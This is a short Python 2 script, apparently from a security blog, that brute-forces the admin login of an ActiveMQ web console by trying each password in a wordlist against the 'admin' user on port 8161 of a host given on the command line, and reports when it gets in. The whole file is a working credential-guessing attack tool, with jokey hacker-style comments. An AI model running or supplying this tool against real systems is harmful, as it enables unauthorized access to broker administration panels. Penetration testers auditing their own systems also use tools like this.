#!/usr/bin/env python
# actlikeMQ.py - simple bruteforcer for ActiveMQ 
# 
# this advanced el1t3c0de will try to access /admin/'s panel
# by using super h1dd3n technique based on reading wordlists
# 
# based on activemq 5.14.3 @22.02.2019:21:10
# 
# more: https://code610.blogspot.com
# 

import sys
import requests
from requests.auth import HTTPBasicAuth

target = sys.argv[1]
remote_host = 'http://' + target + ':8161/admin/'
our_user = 'admin'
pwd_file = '/usr/share/wordlists/dirb/common.txt'

sess = requests.session()

read_pwds = open(pwd_file, 'r')
pwds = read_pwds.readlines()

for pwd in pwds:
  pwd = pwd.rstrip()  
  logme = sess.post(remote_host, auth=HTTPBasicAuth(our_user, pwd))
  logmeresp = logme.text

  #print logmeresp 
  if 'ActiveMQ Console</title>' in logmeresp:
    print '[+] admin user logged-in! :D'
    sys.exit(0) # w0w s0 1337!11 


# o/

